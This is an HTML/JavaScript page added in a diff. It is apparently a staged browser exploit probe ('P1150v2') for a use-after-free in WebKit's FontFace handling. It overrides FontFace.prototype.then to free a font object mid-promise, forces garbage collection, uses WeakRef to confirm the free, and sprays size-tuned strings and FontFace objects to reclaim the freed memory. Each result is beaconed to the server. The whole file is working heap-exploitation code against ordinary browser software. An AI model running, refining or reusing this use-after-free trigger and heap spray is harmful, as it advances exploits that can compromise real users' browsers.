@@ -1,0 +1,179 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1150v2</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1150v2: WEAKREF FREE DETECTION + STRING SPRAY ===');
+log('info','Q1: Is FontFace wrapper GC-able after delete? (WeakRef test)');
+log('info','Q2: Can string spray reclaim CSSFontFace? (bmalloc shared heap)');
+log('info','Q3: Fixed FontFace spray with valid weights');
+B('P1150V2-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var uafHit=false;
+var weakFF=null;
+var hasWeakRef=(typeof WeakRef!=='undefined');
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+  // Save WeakRef but NOT strong ref
+  if(hasWeakRef) weakFF=new WeakRef(this);
+  // Free: remove style + delete from fonts
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});
+
+// === Phase 1: Quick check at 50ms ===
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!uafHit){B('P1150V2-DONE','nohit');return;}
+  B('P1150V2-UAF','hit=true|weakref='+hasWeakRef);
+
+  // Check WeakRef BEFORE GC
+  var preGC='none';
+  if(weakFF){
+    var d=weakFF.deref();
+    preGC=d?'alive':'collected';
+  }
+  log('info','Pre-GC WeakRef: '+preGC);
+  B('P1150V2-PRE-GC',preGC);
+
+  // Heavy GC pressure
+  log('phase','--- GC pressure phase ---');
+  for(var g=0;g<5000;g++){var tmp={a:new Array(100),b:String(g).repeat(20)};tmp=null;}
+  for(var g=0;g<3000;g++){var tmp2=new ArrayBuffer(256);tmp2=null;}
+  // Create objects that force marking
+  var gcArr=[];
+  for(var g=0;g<1000;g++)gcArr.push(new ArrayBuffer(1024));
+  gcArr=null;
+
+  // Check WeakRef AFTER GC pressure
+  var postGC='none';
+  if(weakFF){
+    var d2=weakFF.deref();
+    postGC=d2?'alive':'collected';
+  }
+  log(postGC==='collected'?'win':'info','Post-GC WeakRef: '+postGC);
+  B('P1150V2-POST-GC',postGC);
+
+  // === Test A: String spray (target 192B bmalloc zone) ===
+  log('phase','--- Test A: String spray (168 chars = ~192B StringImpl) ---');
+  var strSpray=[];
+  // StringImpl header is ~20 bytes, so 172 chars × 1 byte = 192 total for 8-bit
+  // Try multiple sizes to hit the right class
+  var strSizes=[160,164,168,172,176];
+  for(var s=0;s<strSizes.length;s++){
+    var sz=strSizes[s];
+    for(var k=0;k<40;k++){
+      // Create unique string of exact length
+      var base='S'+s+'K'+k+'_';
+      var pad=String.fromCharCode(65+(k%26)).repeat(sz-base.length);
+      strSpray.push(base+pad);
+    }
+  }
+  B('P1150V2-A-SPRAY','strings='+strSpray.length);
+
+  // Can't directly check if strings reclaimed CSSFontFace.
+  // But if CSSFontFace was collected AND reclaimed by a string,
+  // then engine access to stale pointer would crash.
+  // Since we're alive, either: (a) no stale access, or (b) no reclaim.
+
+  // === Test B: Fixed FontFace spray with valid weights ===
+  log('phase','--- Test B: FontFace spray with valid weights ---');
+  var ffSpray=[];
+  var validWeights=['100','200','300','400','500','600','700','800','900'];
+  for(var k=0;k<90;k++){
+    var name='sp'+r+'x'+k;
+    var wt=validWeights[k%9];
+    try{
+      var nf=new FontFace(name,'local(Arial)',{
+        style:k%2===0?'normal':'italic',
+        weight:wt,
+        display:k%3===0?'auto':k%3===1?'swap':'fallback'
+      });
+      ffSpray.push({ff:nf,name:name,wt:wt,style:k%2===0?'normal':'italic',
+        disp:k%3===0?'auto':k%3===1?'swap':'fallback'});
+    }catch(e){
+      B('P1150V2-B-ERR','k='+k+'|e='+e.message.substring(0,30));
+    }
+  }
+  B('P1150V2-B-SPRAY','count='+ffSpray.length);
+
+  // Validate spray properties
+  var ffCorrupt=0;
+  var ffDetails=[];
+  for(var k=0;k<ffSpray.length;k++){
+    var s=ffSpray[k];
+    var corrupt=false;
+    var fam='',style='',wt='',disp='';
+    try{fam=s.ff.family;}catch(e){fam='ERR';corrupt=true;}
+    try{style=s.ff.style;}catch(e){style='ERR';corrupt=true;}
+    try{wt=s.ff.weight;}catch(e){wt='ERR';corrupt=true;}
+    try{disp=s.ff.display;}catch(e){disp='ERR';corrupt=true;}
+
+    if(fam!==s.name||style!==s.style||wt!==s.wt||disp!==s.disp) corrupt=true;
+    if(corrupt){
+      ffCorrupt++;
+      if(ffDetails.length<5){
+        ffDetails.push({idx:k,exp_fam:s.name,fam:fam,exp_wt:s.wt,wt:wt,
+          exp_style:s.style,style:style,exp_disp:s.disp,disp:disp});
+      }
+    }
+  }
+
+  log(ffCorrupt>0?'win':'info','Test B: FontFace corrupt='+ffCorrupt+'/'+ffSpray.length);
+  B('P1150V2-B-RESULT','corrupt='+ffCorrupt);
+  for(var i=0;i<ffDetails.length;i++){
+    var d=ffDetails[i];
+    B('P1150V2-B-DETAIL-'+i,'fam:'+d.fam+'!='+d.exp_fam+'|wt:'+d.wt+'!='+d.exp_wt+
+      '|style:'+d.style+'!='+d.exp_style+'|disp:'+d.disp+'!='+d.exp_disp);
+    log('ptr','ff['+d.idx+']: fam='+d.fam+'/'+d.exp_fam+' wt='+d.wt+'/'+d.exp_wt+
+      ' style='+d.style+'/'+d.exp_style+' disp='+d.disp+'/'+d.exp_disp);
+  }
+
+  // === Test C: Second WeakRef check after all sprays ===
+  log('phase','--- Test C: Final WeakRef + fonts.check ---');
+  var finalGC='none';
+  if(weakFF){
+    var d3=weakFF.deref();
+    finalGC=d3?'alive':'collected';
+    if(d3){
+      // Wrapper is STILL alive! Check its properties
+      var wrapperStatus='';
+      try{wrapperStatus=d3.status;}catch(e){wrapperStatus='ERR:'+e.message.substring(0,30);}
+      var wrapperFam='';
+      try{wrapperFam=d3.family;}catch(e){wrapperFam='ERR:'+e.message.substring(0,30);}
+      log('info','Alive wrapper: status='+wrapperStatus+' family='+wrapperFam);
+      B('P1150V2-WRAPPER','status='+wrapperStatus+'|family='+wrapperFam);
+    }
+  }
+  log(finalGC==='collected'?'win':'info','Final WeakRef: '+finalGC);
+  B('P1150V2-FINAL-GC',finalGC);
+
+  var chk='';
+  try{chk=document.fonts.check('1em y'+r);}catch(e){chk='ERR';}
+  B('P1150V2-CHECK','check='+chk);
+
+  // Summary
+  var sum='uaf=true|preGC='+preGC+'|postGC='+postGC+'|finalGC='+finalGC+
+    '|abReclaim=NA|ffCorrupt='+ffCorrupt;
+  log('phase','=== SUMMARY: '+sum+' ===');
+  B('P1150V2-SUMMARY',sum);
+  B('P1150V2-DONE','complete');
+
+},200);
+</script></body></html>
